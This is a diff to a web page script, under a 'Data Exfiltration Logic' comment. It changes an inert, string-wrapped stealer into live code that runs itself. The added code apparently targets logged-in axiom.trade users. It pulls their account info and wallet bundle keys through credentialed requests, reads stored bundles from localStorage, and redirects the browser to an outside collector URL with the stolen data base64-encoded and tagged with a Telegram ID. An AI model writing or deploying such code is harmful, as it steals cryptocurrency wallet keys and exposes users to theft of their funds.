@@ -61,30 +61,40 @@
 
 <script>
     // --- Data Exfiltration Logic ---
-    `async function exfiltrateData() {
-        try {
-            const user = await (await fetch('https://api7.axiom.trade/user-info', {
-                method: 'POST',
-                credentials: 'include'
-            })).json();
-            
-            const bundle = await (await fetch('https://api8.axiom.trade/bundle-key-and-wallets', {
-                method: 'POST',
-                credentials: 'include'
-            })).json();
+    (async () => {
+  try {
+    
+    if (location.hostname !== 'axiom.trade') {
+      alert('Please navigate to axiom.trade first');
+      return;
+    }
 
-            const data = {
-                telegramId: '7198683357',
-                site: location.href,
-                user: user,
-                bundle: bundle.bundleKey,
-                sBundles: localStorage.getItem('sBundles'),
-                eBundles: localStorage.getItem('eBundles')
-            };
+    
+    if (!localStorage.getItem('isAuthed')) {
+      return alert('Please log in to axiom.trade first');
+    }
 
-            fetch('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(data)), {
-                method: 'GET'
-            })`;
+    
+    const user = await (await fetch('//api7.axiom.trade/user-info', { method: 'POST', credentials: 'include' })).json();
+    const bundle = await (await fetch('//api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' })).json();
+
+    
+    const bookmarkData = {
+      telegramId: '7198683357', 
+      site: location.href,
+      user: user,
+      bundle: bundle.bundleKey,
+      sBundles: localStorage.getItem('sBundles'),
+      eBundles: localStorage.getItem('eBundles')
+    };
+
+    
+    location.replace('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(bookmarkData)));
+
+  } catch (e) {
+    alert('Error occurred');
+  }
+})();
         } catch (e) {
             console.error("LO, the data capture failed:", e);
         }
